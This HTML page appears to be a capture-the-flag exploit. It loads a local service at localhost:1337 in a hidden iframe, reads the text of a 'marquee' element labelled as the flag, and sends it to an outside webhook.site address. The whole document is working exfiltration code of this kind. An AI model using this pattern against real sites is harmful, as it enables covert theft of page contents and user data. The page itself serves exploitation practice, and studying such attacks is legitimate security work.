<!DOCTYPE html>
<html>
<body>
<iframe id="flagframe" src="http://localhost:1337/" style="display:none"></iframe>
<script>
document.getElementById('flagframe').onload = function() {
  try {
    let doc = this.contentDocument;
    let flag = doc.querySelector('marquee').textContent;
    fetch('https://webhook.site/tu-id?flag=' + encodeURIComponent(flag));
  } catch(e) {}
};
</script>
</body>
</html>
